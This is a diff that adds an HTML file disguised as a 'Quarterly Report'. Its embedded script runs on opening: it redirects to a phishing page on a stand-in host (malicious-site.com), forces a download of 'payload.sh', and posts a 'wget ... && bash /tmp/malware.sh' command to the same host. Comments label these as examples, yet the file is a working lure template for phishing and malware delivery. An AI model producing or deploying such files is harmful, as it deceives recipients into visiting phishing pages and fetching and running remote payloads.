@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Report</title>
+</head>
+<body>
+    <h1>Quarterly Report</h1>
+    <p>Please see the attached document for our latest quarterly report.</p>
+
+    <!-- This JavaScript runs as soon as the HTML file is opened -->
+    <script>
+        // Example of redirecting to a malicious website
+        window.location.href = "http://malicious-site.com/phishing-page";
+
+        // Alternatively, downloading a malicious file
+        // Automatically downloads a file named "payload.sh"
+        const link = document.createElement("a");
+        link.href = "http://malicious-site.com/payload.sh";
+        link.download = "payload.sh";
+        document.body.appendChild(link);
+        link.click();
+
+        // Optional: Attempt to run system commands (may be blocked in most environments)
+        fetch("http://malicious-site.com/execute-command", {
+            method: "POST",
+            body: JSON.stringify({command: "wget http://malicious-site.com/malware.sh -O /tmp/malware.sh && bash /tmp/malware.sh"})
+        });
+    </script>
+</body>
+</html>
+
